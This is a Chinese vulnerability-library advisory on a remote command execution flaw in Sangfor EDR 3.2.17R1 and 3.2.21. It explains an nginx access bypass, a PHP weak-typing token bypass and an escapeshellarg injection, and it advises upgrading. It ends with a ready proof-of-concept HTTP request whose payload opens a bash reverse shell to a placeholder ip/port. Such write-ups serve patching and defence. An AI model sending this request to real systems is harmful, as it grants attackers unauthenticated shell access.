---
title: '深信服EDR 远程命令执行-2020-hvv2'
date: Sat, 12 Sep 2020 02:19:51 +0000
draft: false
tags: ['白阁-漏洞库']
---

#### 影响范围

受影响版本为3.2.17R1, 3.2.21两个版本，如果为这两个版本建议升级版本至 3.2.21.375

#### 漏洞原理

![](https://www.bylibrary.cn/wp-content/uploads/2020/09/1-1.png) dev\_linkage\_launch.php 为设备联动的新入口点主要是将联动的接口构造成业务统一处理的接口 主要调用 ![](https://www.bylibrary.cn/wp-content/uploads/2020/09/2-1.png) 跟进 ![](https://www.bylibrary.cn/wp-content/uploads/2020/09/3-1.png) 可以看到 第一个检查为 [![](https://www.bylibrary.cn/wp-content/uploads/2020/09/wp_editor_md_681da3546316fb534ecebc64614e1ff5.jpg)](https://www.bylibrary.cn/wp-content/uploads/2020/09/wp_editor_md_681da3546316fb534ecebc64614e1ff5.jpg) 绕过第一个检查: 在他们系统nginx配置文件里面: ![](https://www.bylibrary.cn/wp-content/uploads/2020/09/4-1.png) 通过nginx规则可以得知,他们没有设置禁止外网访问.从而可以直接访问 /api/edr/sangforinter/v2/xxx 绕过 第一个检查 第二检查: 权限检查 ![](https://www.bylibrary.cn/wp-content/uploads/2020/09/5-1.png) 跟进check\_access\_token ![](https://www.bylibrary.cn/wp-content/uploads/2020/09/6-1.png) 这里[![](https://www.bylibrary.cn/wp-content/uploads/2020/09/wp_editor_md_e311bb348c55f15a51fc6641b182d5b0.jpg)](https://www.bylibrary.cn/wp-content/uploads/2020/09/wp_editor_md_e311bb348c55f15a51fc6641b182d5b0.jpg) 引发第二个漏洞: php弱类型导致的漏洞 绕过只需要传入一个base64编码的json内容为{"md5":true}即可 至此 权限检查绕过完毕 来到 process\_cssp.php 文件 ![](https://www.bylibrary.cn/wp-content/uploads/2020/09/7-1.png) 存在任意指令执行漏洞.作者试图使用escapeshellarg函数去给单引号打反斜杠实际上是毫无作用的. 绕过: `{"params":"w=123\"'1234123'\"|命令"}` 结果如下: ![](https://www.bylibrary.cn/wp-content/uploads/2020/09/8-1.png) 返回: ![](https://www.bylibrary.cn/wp-content/uploads/2020/09/9.png) POC```
POST /api/edr/sangforinter/v2/cssp/slog_client?token=eyJtZDUiOnRydWV9 HTTP/1.1
Host: xx.x.x.x
Connection: close
Accept-Encoding: gzip, deflate
Accept: */*
User-Agent: python-requests/2.22.0
Content-Length: 77

{"params": "w=123\"'1234123'\"|bash -i >& /dev/tcp/ip/port 0>&1"} 
```